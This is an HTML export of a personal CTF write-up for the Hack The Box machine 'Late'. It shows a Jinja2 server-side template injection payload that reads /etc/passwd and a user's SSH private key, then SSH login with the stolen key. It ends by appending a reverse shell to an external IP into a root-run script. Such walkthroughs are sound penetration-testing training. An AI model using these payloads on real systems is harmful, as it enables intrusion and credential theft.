<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>late</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>late</h1><br/><p><strong><h1>HTB: Late</h1></strong></p><p></p><p><img src="images/33-1.png" alt="images/33-1.png" /></p><p></p><p></p><p>When we look on the homepage or in source code we have a reference to: <strong>http;//images.late.htb</strong></p><p></p><p>We add it in hosts file as.</p><p></p><p><strong>10.10.11.156    images.late.htb</strong></p><p></p><p>We visit images.late.htb</p><p></p><p>It is a OCR site. It will scan out texts from images.</p><p></p><p></p><p>Here we try <strong>Server Side Template Injection(SSTI)</strong></p><p></p><p><em><strong>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</strong></em></p><p></p><p>The first Payloads to test.</p><p></p><p>{{7*7}}</p><p>${7*7}</p><p>&lt;%= 7*7 %&gt;</p><p>${{7*7}}</p><p>#{7*7}</p><p></p><p></p><p>We write the above in <strong>mousepad</strong> and take a screenshot in <strong>flameshot</strong>,  then save the image.</p><p>When we upload the image, we got result.txt</p><p></p><p>It was evaluating the value for first payload <strong>{{7*7}}</strong>  to <strong>49</strong> confirming that the app is vulnerable to SSTI.</p><p></p><p></p><p>Upon Researching the tools. We find that backend is <strong>Flask</strong> which uses <strong>Jinja</strong></p><p></p><p>Searching for <strong>jinja</strong> specific exploit in the hacktricks link, we found the following.</p><p></p><p><img src="images/33-2.png" alt="images/33-2.png" /></p><p></p><p><strong>{{ get_flashed_messages.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }}</strong></p><p></p><p></p><p>once we run this using image. We got the output in results.txt</p><p></p><p>Then we read the id_rsa file and copy its contents to a local id_rsa file.</p><p></p><p><strong>{{ get_flashed_messages.__globals__.__builtins__.open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read() }}</strong></p><p></p><p>We copy the contents of result.txt into a <strong>local id_rsa file</strong></p><p><strong>chmod 600 id_rsa</strong></p><p></p><p><strong>ssh -i id_rsa svc_acc@10.10.11.156</strong></p><p></p><p>Now we can ssh into user account without any password.</p><p></p><p><strong>Privilege Escalation</strong></p><p></p><p>I ran LINPeas in the server and it showed a vulnerable script file.</p><p><strong>/usr/local/sbin/ssh-alert.sh</strong></p><p></p><p>This file runs as root whenever a ssh connection is made. This can be verified using <strong>pspy64</strong> and observing the processes.</p><p></p><p>On Paper it seems we have write access to <strong>/usr/local/sbin/ssh-alert.sh</strong></p><p>But upon writing we fail.</p><p></p><p><strong>lsattr /usr/local/sbin/ssh-alert.sh</strong></p><p>Shows us that only append is possible.</p><p></p><p>so we make a file containing a reverse shell in /tmp folder.</p><p></p><p><strong>echo ‘/bin/sh -i &gt;&amp; /dev/tcp/10.10.16.4/6666 0&gt;&amp;1’ &gt; /tmp/append.txt</strong></p><p></p><p>Then we run the following command to append the payload inside the script</p><p></p><p><strong>cat /tmp/appendt.txt &gt;&gt; /usr/local/sbin/ssh-alert.sh</strong></p><p><strong>Note:</strong> After each ssh login, this file is refreshed.</p><p>So as soon as we append this payload.</p><p>Start listener and make another ssh connection to the machine</p><p></p><p>This is give us a root shell in the listner.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
